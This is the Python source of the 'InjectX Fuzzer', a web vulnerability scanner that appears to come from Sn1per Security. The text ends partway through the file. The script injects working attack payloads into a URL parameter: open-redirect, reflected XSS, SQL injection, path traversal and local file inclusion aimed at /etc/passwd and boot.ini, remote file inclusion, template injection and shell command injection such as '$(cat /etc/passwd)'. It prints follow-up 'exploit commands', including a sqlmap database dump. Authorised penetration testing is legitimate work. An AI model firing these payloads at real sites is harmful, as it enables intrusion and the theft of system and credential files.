#!/usr/bin/python3
# InjectX Fuzzer v20230331 by @xer0dayz
# https://sn1persecurity.com

from __future__ import print_function
from urllib.parse import urlparse
import urllib.request, sys, os, optparse
from socket import timeout

OKBLUE='\033[94m'
OKRED='\033[91m'
OKGREEN='\033[92m'
OKORANGE='\033[93m'
COLOR1='\033[95m'
COLOR2='\033[96m'
COLOR3='\033[90m'
RESET='\x1b[0m'
VERBOSE='1'

def logo():
    print(OKORANGE + '      ____        _           __ _  __' + RESET)
    print(OKORANGE + '     /  _/___    (_)__  _____/ /| |/ /' + RESET)
    print(OKORANGE + '     / // __ \  / / _ \/ ___/ __/   / ' + RESET)
    print(OKORANGE + '   _/ // / / / / /  __/ /__/ /_/   |  ' + RESET)
    print(OKORANGE + '  /___/_/ /_/_/ /\___/\___/\__/_/|_|  ' + RESET)
    print(OKORANGE + '         /_____/                     ' + RESET)
    print('')
    print(OKGREEN +   '--== Inject-X Fuzzer by @xer0dayz ==-- ' + RESET)
    print(OKGREEN +   '   --== https://sn1persecurity.com ==-- ' + RESET)
    print('')

if os.path.isfile("/tmp/injectx.txt"):
    os.remove("/tmp/injectx.txt")

f = open('/tmp/injectx.txt', 'w')

def active_scan():

    new_url = base_url

    # Open Redirect 1 ######################################################################################
    try:
        redirect_exploit = urllib.parse.quote("google.com")

        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(redirect_exploit) + RESET)

        redirect_url = new_url.replace("INJECTX", redirect_exploit)
        http_request = urllib.request.urlopen(redirect_url)
        http_response = str(http_request.read())
        http_length = len(http_response)
        http_status = http_request.getcode()
        http_length_diff = str(http_length_base - http_length)

        if (verbose == "y"):
            print(COLOR2 + "[i] New URL: " + redirect_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

        if "<title>Google</title>" in http_response:
            print(OKRED + "[+] Open Redirect Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + redirect_url + RESET)
            print(OKGREEN + "[c] Exploit Command: curl -s -I '" + redirect_url + "' | egrep location --color=auto")
            f.write("P3 - MEDIUM, Open Redirect, " + str(redirect_url) + ", " + str(http_status) + "\n")

    except:
        pass

    # Open Redirect 2 ######################################################################################
    try:
        redirect_exploit = urllib.parse.quote("//google.com")

        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(redirect_exploit) + RESET)

        redirect_url = new_url.replace("INJECTX", redirect_exploit)
        http_request = urllib.request.urlopen(redirect_url)
        http_response = str(http_request.read())
        http_length = len(http_response)
        http_status = http_request.getcode()
        http_length_diff = str(http_length_base - http_length)

        if (verbose == "y"):
            print(COLOR2 + "[i] New URL: " + redirect_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

        if "<title>Google</title>" in http_response:
            print(OKRED + "[+] Open Redirect Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + redirect_url + RESET)
            print(OKGREEN + "[c] Exploit Command: curl -s -I '" + redirect_url + "' | egrep location --color=auto")
            f.write("P3 - MEDIUM, Open Redirect, " + str(redirect_url) + ", " + str(http_status) + "\n")

    except:
        pass

    # Open Redirect 3 ######################################################################################
    try:
        redirect_exploit = urllib.parse.quote("https://google.com")

        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(redirect_exploit) + RESET)

        redirect_url = new_url.replace("INJECTX", redirect_exploit)
        http_request = urllib.request.urlopen(redirect_url)
        http_response = str(http_request.read())
        http_length = len(http_response)
        http_status = http_request.getcode()
        http_length_diff = str(http_length_base - http_length)

        if (verbose == "y"):
            print(COLOR2 + "[i] New URL: " + redirect_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

        if "<title>Google</title>" in http_response:
            print(OKRED + "[+] Open Redirect Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + redirect_url + RESET)
            print(OKGREEN + "[c] Exploit Command: curl -s -I '" + redirect_url + "' | egrep location --color=auto")
            f.write("P3 - MEDIUM, Open Redirect, " + str(redirect_url) + ", " + str(http_status) + "\n")

    except:
        pass

    # XSS ######################################################################################

    try:
        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(payload) + RESET)

        http_request = urllib.request.urlopen(new_url)
        http_response = str(http_request.read())
        http_length = len(http_response)
        http_status = http_request.getcode()
        http_length_diff = str(http_length_base - http_length)
        if (verbose == "y"):
            print(COLOR2 + "[i] New URL: " + new_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

        # CHECK FOR REFLECTED VALUE
        if payload in http_response:
            print(OKGREEN + "[+] Reflected Value Detected! " + RESET)
            f.write("P5 - INFO, Reflected Value Detected, " + str(new_url) + ", Payload: " + str(payload) + "\n")

            # IF REFLECTED, TRY HEURISTIC STRING
            payload_exploit_unencoded = '</INJECTX>(1)'
            payload_exploit = '%22%3E%3C%2FINJECTX%3E%281%29'
            xss_url = new_url.replace("INJECTX", payload_exploit)

            try:
                http_request = urllib.request.urlopen(xss_url)
                http_response = str(http_request.read())
                http_length = len(http_response)
                http_length_diff = str(http_length_base - http_length)
                http_status = http_request.getcode()
                if (verbose == "y"):
                    print(COLOR2 + "[i] New URL: " + xss_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

            except:
                pass

            # CONTINUE TO XSS EXPLOITATION
            if payload_exploit_unencoded in http_response:
                payload_exploit2 = urllib.parse.quote('"><iframe/onload=alert(1)>')
                xss_url2 = new_url.replace("INJECTX", payload_exploit2)

                try:
                    http_request = urllib.request.urlopen(xss_url2)
                    http_response = str(http_request.read())
                    http_length = len(http_response)
                    http_length_diff = str(http_length_base - http_length)
                    http_status = http_request.getcode()

                    if (verbose == "y"):
                        print(COLOR2 + "[i] New URL: " + xss_url2 + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

                    print(OKRED + "[+] XSS Found! ", str(payload_exploit2) + RESET)
                    print(OKRED + "[+] Vulnerable URL: " + xss_url2 + RESET)
                    print(OKGREEN + "[c] Exploit Command: firefox '" + xss_url2 + "' & ")
                    os.system("curl -s '" + xss_url2 + "' | egrep alert\(1\) --color=auto")
                    f.write("P3 - MEDIUM, Cross-Site Scripting (XSS), " + str(xss_url2) + ", " + str(payload_exploit2) + "\n")
                    #os.system("firefox '" + xss_url2 + "' > /dev/null 2> /dev/null")
                except:
                    pass

    except:
        pass

    # SQLi ######################################################################################
    try:
        sqli_exploit = '\''
        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(sqli_exploit) + RESET)

        sqli_url = new_url.replace("INJECTX", sqli_exploit)
        http_request = urllib.request.urlopen(sqli_url)
        http_response = str(http_request.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        if (verbose == "y"):
            print(COLOR2 + "[i] New URL: " + sqli_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

        if "SQL" in http_response or http_status == 500 or http_status == 503:
            print(OKRED + "[+] SQL Injection Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + sqli_url + RESET)
            sqlmap_command = 'sqlmap --batch --dbs -u "' + full_url + '"'
            print(OKGREEN + "[c] Exploit Command: " + sqlmap_command)
            #os.system(sqlmap_command)
            f.write("P2 - HIGH, SQL Injection, " + str(sqli_url) + ", " + str(full_url) + "\n")

    except:
        pass

    # SQLi 2 ######################################################################################
    try:
        sqli_exploit = '\\'
        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(sqli_exploit) + RESET)

        sqli_url = new_url.replace("INJECTX", sqli_exploit)
        http_request = urllib.request.urlopen(sqli_url)
        http_response = str(http_request.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        if (verbose == "y"):
            print(COLOR2 + "[i] New URL: " + sqli_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

        if "SQL" in http_response or http_status == 500 or http_status == 503:
            print(OKRED + "[+] SQL Injection Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + sqli_url + RESET)
            sqlmap_command = 'sqlmap --batch --dbs -u "' + full_url + '"'
            print(OKGREEN + "[c] Exploit Command: " + sqlmap_command)
            #os.system(sqlmap_command)
            f.write("P2 - HIGH, SQL Injection, " + str(sqli_url) + ", " + str(full_url) + "\n")

    except:
        pass

    # Windows Directory Traversal ######################################################################################
    try:
        traversal_exploit = '/..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\\boot.ini'
        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(traversal_exploit) + RESET)

        traversal_url = new_url.replace("INJECTX", traversal_exploit)
        http_request = urllib.request.urlopen(traversal_url)
        http_response = str(http_request.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        if (verbose == "y"):
            print(COLOR2 + "[i] New URL: " + traversal_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

        if "boot loader" in http_response or "16-bit" in http_response:
            print(OKRED + "[+] Windows Directory Traversal Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + traversal_url + RESET)
            print(OKGREEN + "[c] Exploit Command: curl -s '" + traversal_url + "' | egrep Windows --color=auto")
            f.write("P2 - HIGH, Directory Traversal, " + str(traversal_url) + ", " + str(traversal_exploit) + "\n")

    except:
        pass

    # Windows Directory Traversal 2 ######################################################################################
    try:
        traversal_exploit = '/..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\\boot.ini%00'
        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(traversal_exploit) + RESET)

        traversal_url = new_url.replace("INJECTX", traversal_exploit)
        http_request = urllib.request.urlopen(traversal_url)
        http_response = str(http_request.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        if (verbose == "y"):
            print(COLOR2 + "[i] New URL: " + traversal_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

        if "boot loader" in http_response or "16-bit" in http_response:
            print(OKRED + "[+] Windows Directory Traversal Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + traversal_url + RESET)
            print(OKGREEN + "[c] Exploit Command: curl -s '" + traversal_url + "' | egrep Windows --color=auto")
            f.write("P2 - HIGH, Directory Traversal, " + str(traversal_url) + ", " + str(traversal_exploit) + "\n")

    except:
        pass

    # Windows Directory Traversal 3 ######################################################################################
    try:
        traversal_exploit = '..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00test.htm'
        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(traversal_exploit) + RESET)

        traversal_url = new_url.replace("INJECTX", traversal_exploit)
        http_request = urllib.request.urlopen(traversal_url)
        http_response = str(http_request.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        if (verbose == "y"):
            print(COLOR2 + "[i] New URL: " + traversal_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

        if "boot loader" in http_response or "16-bit" in http_response or "16-bit" in http_response:
            print(OKRED + "[+] Windows Directory Traversal Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + traversal_url + RESET)
            print(OKGREEN + "[c] Exploit Command: curl -s '" + traversal_url + "' | egrep Windows --color=auto" + RESET)
            f.write("P2 - HIGH, Directory Traversal, " + str(traversal_url) + ", " + str(traversal_exploit) + "\n")

    except:
        pass

    # Windows Directory Traversal 4 ######################################################################################
    try:
        traversal_exploit = '..%2fWEB-INF%2fweb.xml'
        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(traversal_exploit) + RESET)

        traversal_url = new_url.replace("INJECTX", traversal_exploit)
        http_request = urllib.request.urlopen(traversal_url)
        http_response = str(http_request.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        if (verbose == "y"):
            print(COLOR2 + "[i] New URL: " + traversal_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

        if "<web-app" in http_response:
            print(OKRED + "[+] Windows Directory Traversal Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + traversal_url + RESET)
            print(OKGREEN + "[c] Exploit Command: curl -s '" + traversal_url + "' | egrep Windows --color=auto" + RESET)
            f.write("P2 - HIGH, Directory Traversal, " + str(traversal_url) + ", " + str(traversal_exploit) + "\n")

    except:
        pass

    # Linux Directory Traversal ######################################################################################
    try:
        traversal_exploit = '/../../../../../../../../../../../../../../../../../etc/passwd'
        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(traversal_exploit) + RESET)

        traversal_url = new_url.replace("INJECTX", traversal_exploit)
        http_request = urllib.request.urlopen(traversal_url)
        http_response = str(http_request.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        if (verbose == "y"):
            print(COLOR2 + "[i] New URL: " + traversal_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

        if "root:" in http_response:
            print(OKRED + "[+] Linux Directory Traversal Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + traversal_url + RESET)
            print(OKGREEN + "[c] Exploit Command: curl -s '" + traversal_url + "' | egrep root --color=auto" + RESET)
            f.write("P2 - HIGH, Directory Traversal, " + str(traversal_url) + ", " + str(traversal_exploit) + "\n")

    except:
        pass

    # Linux Directory Traversal 2 ######################################################################################
    try:
        traversal_exploit = '/../../../../../../../../../../../../../../../../../etc/passwd%00'
        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(traversal_exploit) + RESET)

        traversal_url = new_url.replace("INJECTX", traversal_exploit)
        http_request = urllib.request.urlopen(traversal_url)
        http_response = str(http_request.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        if (verbose == "y"):
            print(COLOR2 + "[i] New URL: " + traversal_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

        if "root:" in http_response:
            print(OKRED + "[+] Linux Directory Traversal Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + traversal_url + RESET)
            print(OKGREEN + "[c] Exploit Command: curl -s '" + traversal_url + "' | egrep root --color=auto" + RESET)
            f.write("P2 - HIGH, Directory Traversal, " + str(traversal_url) + ", " + str(traversal_exploit) + "\n")

    except:
        pass

    # LFI Check ######################################################################################
    try:
        rfi_exploit = '/etc/passwd'
        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(rfi_exploit) + RESET)

        rfi_url = new_url.replace("INJECTX", rfi_exploit)
        http_request = urllib.request.urlopen(rfi_url)
        http_response = str(http_request.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        if (verbose == "y"):
            print(COLOR2 + "[i] New URL: " + rfi_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

        if "root:" in http_response:
            print(OKRED + "[+] Linux Local File Inclusion Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + rfi_url + RESET)
            print(OKGREEN + "[c] Exploit Command: curl -s '" + rfi_url + "' | egrep 'root:' --color=auto" + RESET)
            f.write("P2 - HIGH, Local File Inclusion, " + str(rfi_url) + ", " + str(rfi_exploit) + "\n")

    except:
        pass

    # LFI Check 2 ######################################################################################
    try:
        rfi_exploit = '/etc/passwd%00'
        if (verbose == "y"):
            print (COLOR2 + "[i] Trying Payload: " + str(rfi_exploit) + RESET)

        rfi_url = new_url.replace("INJECTX", rfi_exploit)
        http_request = urllib.request.urlopen(rfi_url)
        http_response = str(http_request.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        if (verbose == "y"):
            print(COLOR2 + "[i] New URL: " + rfi_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

        if "root:" in http_response:
            print(OKRED + "[+] Linux Local File Inclusion Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + rfi_url + RESET)
            print(OKGREEN + "[c] Exploit Command: curl -s '" + rfi_url + "' | egrep 'root:' --color=auto" + RESET)
            f.write("P2 - HIGH, Local File Inclusion, " + str(rfi_url) + ", " + str(rfi_exploit) + "\n")

    except:
        pass

    # LFI Check 3 ######################################################################################
    try:
        rfi_exploit = 'C:\\boot.ini'
        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(rfi_exploit) + RESET)

        rfi_url = new_url.replace("INJECTX", rfi_exploit)
        http_request = urllib.request.urlopen(rfi_url)
        http_response = str(http_request.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        if (verbose == "y"):
            print(COLOR2 + "[i] New URL: " + rfi_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

        if "boot loader" in http_response or "16-bit" in http_response:
            print(OKRED + "[+] Windows Local File Inclusion Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + rfi_url + RESET)
            print(OKGREEN + "[c] Exploit Command: curl -s '" + rfi_url + "' | egrep 'root:' --color=auto" + RESET)
            f.write("P2 - HIGH, Local File Inclusion, " + str(rfi_url) + ", " + str(rfi_exploit) + "\n")

    except:
        pass

    # LFI Check 4 ######################################################################################
    try:
        rfi_exploit = 'C:\\boot.ini%00'
        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(rfi_exploit) + RESET)

        rfi_url = new_url.replace("INJECTX", rfi_exploit)
        http_request = urllib.request.urlopen(rfi_url)
        http_response = str(http_request.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        if (verbose == "y"):
            print(COLOR2 + "[i] New URL: " + rfi_url + " [" + OKRED + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

        if "boot loader" in http_response or "16-bit" in http_response:
            print(OKRED + "[+] Local File Inclusion Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + rfi_url + RESET)
            print(OKGREEN + "[c] Exploit Command: curl -s '" + rfi_url + "' | egrep 'root:' --color=auto" + RESET)
            f.write("P2 - HIGH, Local File Inclusion, " + str(rfi_url) + ", " + str(rfi_exploit) + "\n")

    except:
        pass

    # RFI Check ######################################################################################
    try:
        rfi_exploit = 'hTtP://tests.arachni-scanner.com/rfi.md5.txt'
        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(rfi_exploit) + RESET)

        rfi_url = new_url.replace("INJECTX", rfi_exploit)
        http_request = urllib.request.urlopen(rfi_url)
        http_response = str(http_request.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        if (verbose == "y"):
            print(COLOR2 + "[i] New URL: " + rfi_url + " [" + OKRED + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

        if "705cd559b16e6946826207c2199bd890" in http_response:
            print(OKRED + "[+] Remote File Inclusion Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + rfi_url + RESET)
            print(OKGREEN + "[c] Exploit Command: curl -s '" + rfi_url + "' | egrep 705cd559b16e6946826207c2199bd890 --color=auto")
            f.write("P2 - HIGH, Remote File Inclusion, " + str(rfi_url) + ", " + str(rfi_exploit) + "\n")

    except:
        pass

    # RFI Check 2 ######################################################################################
    try:
        rfi_exploit = 'hTtP://tests.arachni-scanner.com/rfi.md5.txt%00'
        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(rfi_exploit) + RESET)

        rfi_url = new_url.replace("INJECTX", rfi_exploit)
        http_request = urllib.request.urlopen(rfi_url)
        http_response = str(http_request.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        if (verbose == "y"):
            print(COLOR2 + "[i] New URL: " + rfi_url + " [" + OKRED + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

        if "705cd559b16e6946826207c2199bd890" in http_response:
            print(OKRED + "[+] Remote File Inclusion Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + rfi_url + RESET)
            print(OKGREEN + "[c] Exploit Command: curl -s '" + rfi_url + "' | egrep 705cd559b16e6946826207c2199bd890 --color=auto")
            f.write("P2 - HIGH, Remote File Inclusion, " + str(rfi_url) + ", " + str(rfi_exploit) + "\n")

    except:
        pass

    # IDOR Check ######################################################################################
    #idor_list = [1,2,3]
    #idor_length_list = []
    #for idor in idor_list:
    #    try:
    #        idor_exploit = str(idor)
    #        # print COLOR2 + "[i] Trying Payload: " + str(idor) + RESET
    #        idor_url = new_url.replace("INJECTX", idor_exploit)
    #        http_request = urllib.request.urlopen(idor_url)
    #        http_response = http_request.read()
    #        http_length = len(http_response)
    #        http_status = http_request.getcode()
    #        idor_length_list.append(http_length)
    #        http_length_diff = str(http_length_base - http_length)
    #        #print(COLOR2 + "[i] New URL: " + idor_url + " [" + OKRED + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
    #
    #        if (idor_length_list[0] != idor_length_list[1]) or (idor_length_list[1] != idor_length_list[2]) or (idor_length_list[0] != idor_length_list[2]):
    #            print(OKRED + "[+] Possible IDOR Found! " + RESET)
    #            print(OKRED + "[+] Vulnerable URL: " + idor_url + RESET)
    #            print(OKGREEN + "[c] Exploit Command: curl -s '" + idor_url + "'")
    #        #else:
    #            #print(COLOR1 + "[F] IDOR Failed." + RESET)
    #    except:
    #        pass

    # Buffer Overflow Check ######################################################################################
    #try:
    #    overflow_exploit = "INJECTX" * 4000
    #    # print COLOR2 + "[i] Trying Payload: " + "INJECTXINJECTXINJECTXINJECTXINJECTXINJECTX..." + RESET
    #    overflow_url = new_url.replace("INJECTX", overflow_exploit)
    #    http_request = urllib.request.urlopen(overflow_url)
    #    http_response = http_request.read()
    #    http_length = len(http_response)
    #    http_status = http_request.getcode()
    #    print COLOR2 + "[i] New URL: " + new_url + "INJECTXINJECTXINJECTXINJECTXINJECTXINJECTX..." + " [" + OKRED + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + RESET
    #
    #    if http_status != 200 or http_status != 414 or http_status != 413:
    #        print OKGREEN + "[+] Possible Buffer Overflow Found! " + RESET
    #    else:
    #        print COLOR1 + "[F] Buffer Overflow Failed." + RESET
    #except:
    #    pass
    #

    # SSTI Check ######################################################################################
    try:
        ssti_exploit = urllib.parse.quote('{{1336%2B1}}')
        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(ssti_exploit) + RESET)
        ssti_url = new_url.replace("INJECTX", ssti_exploit)
        http_request = urllib.request.urlopen(ssti_url)
        http_response = str(http_request.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        if (verbose == "y"):
            print(COLOR2 + "[i] New URL: " + ssti_url + " [" + OKRED + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

        if "1337" in http_response:
            print(OKRED + "[+] Server Side Template Injection Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + ssti_url + RESET)
            print(OKGREEN + "[c] Exploit Command: curl -s '" + ssti_url + "' | egrep 1337 --color=auto" + RESET)
            f.write("P3 - MEDIUM, Server Side Template Injection, " + str(ssti_url) + ", " + str(ssti_exploit) + "\n")

    except:
        pass

    # SSTI Check 2 ######################################################################################
    try:
        ssti_exploit = urllib.parse.quote('1336+1')
        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(ssti_exploit) + RESET)

        ssti_url = new_url.replace("INJECTX", ssti_exploit)
        http_request = urllib.request.urlopen(ssti_url)
        http_response = str(http_request.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        if (verbose == "y"):
            print(COLOR2 + "[i] New URL: " + ssti_url + " [" + OKRED + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

        if "1337" in http_response:
            print(OKRED + "[+] Server Side Template Injection Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + ssti_url + RESET)
            print(OKGREEN + "[c] Exploit Command: curl -s '" + ssti_url + "' | egrep 1337 --color=auto" + RESET)
            f.write("P3 - MEDIUM, Server Side Template Injection, " + str(ssti_url) + ", " + str(ssti_exploit) + "\n")

    except:
        pass

    # RCE Linux Check ######################################################################################
    try:
        rce_exploit = urllib.parse.quote('$(cat+/etc/passwd)')
        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(rce_exploit) + RESET)

        rce_url = new_url.replace("INJECTX", rce_exploit)
        http_request = urllib.request.urlopen(rce_url)
        http_response = str(http_request.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        if (verbose == "y"):
            print(COLOR2 + "[i] New URL: " + rce_url + " [" + OKRED + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

        if "root:" in http_response:
            print(OKRED + "[+] Linux Command Injection Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + rce_url + RESET)
            print(OKGREEN + "[c] Exploit Command: curl -s '" + rce_url + "' | egrep root: --color=auto" + RESET)
            f.write("P1 - Critical, Command Execution, " + str(rce_url) + ", " + str(rce_exploit) + "\n")

    except:
        pass

    # RCE Linux Check 2 ######################################################################################
    try:
        rce_exploit = urllib.parse.quote('$(sleep+10)')
        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(rce_exploit) + RESET)

        rce_url = new_url.replace("INJECTX", rce_exploit)
        http_request = urllib.request.urlopen(rce_url)
        http_response = str(http_request.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        if (verbose == "y"):
            print(COLOR2 + "[i] New URL: " + rce_url + " [" + OKRED + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

        if "root:" in http_response:
            print(OKRED + "[+] Linux Time Based Command Injection Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + rce_url + RESET)
            print(OKGREEN + "[c] Exploit Command: curl -s '" + rce_url + "' | egrep root: --color=auto" + RESET)
            f.write("P1 - Critical, Command Execution, " + str(rce_url) + ", " + str(rce_exploit) + "\n")

    except:
        pass

    # RCE PHP Check ######################################################################################
    try:
        rce_exploit = urllib.parse.quote('phpinfo()')
        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(rce_exploit) + RESET)

        rce_url = new_url.replace("INJECTX", rce_exploit)
        http_request = urllib.request.urlopen(rce_url)
        http_response = http_request.read()
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        if (verbose == "y"):
            print(COLOR2 + "[i] New URL: " + rce_url + " [" + OKRED + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

        if "<title>phpinfo()</title>" in http_response:
            print(OKRED + "[+] Generic PHP Command Injection Found! " + RESET)
